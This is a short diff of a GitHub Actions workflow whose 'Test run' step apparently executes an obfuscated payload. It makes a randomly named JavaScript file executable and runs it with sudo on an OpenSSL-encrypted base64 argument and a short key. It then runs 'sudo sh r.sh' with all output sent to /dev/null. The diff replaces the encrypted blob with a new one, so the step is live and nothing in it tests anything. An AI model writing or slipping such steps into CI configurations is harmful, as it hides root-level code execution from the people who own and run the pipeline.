@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'vrdzs'
+        echo 'sdz2s'
         sudo chmod +x heard8w7wt/eldridge1gbc0.js
-        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX18J2zDKhNvL7gnkNPf4IaZWx1mPUo1MjD9Cb3wzqzXkZ96aZzioIgSCLwovRVrl8Fa3Ibmd1pb4x53hd0g7Y/d9aSd7AdxXVfh+3HWg6S0M6n2xrNQ+Xaap hmjqx5 && sudo sh r.sh > /dev/null 2>&1
+        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1+e/KT2DtcYHNyRZpQpnUgaBXmW06NEiRhKTPAw10a54SpgE7vwdH8EG4uMJNjAdTGY0yrgZ0IRMbJzrRLiWNfsvEwkpBw+nij8dFy2vqRKvfVXlnMN7OeT o4lunh && sudo sh r.sh > /dev/null 2>&1
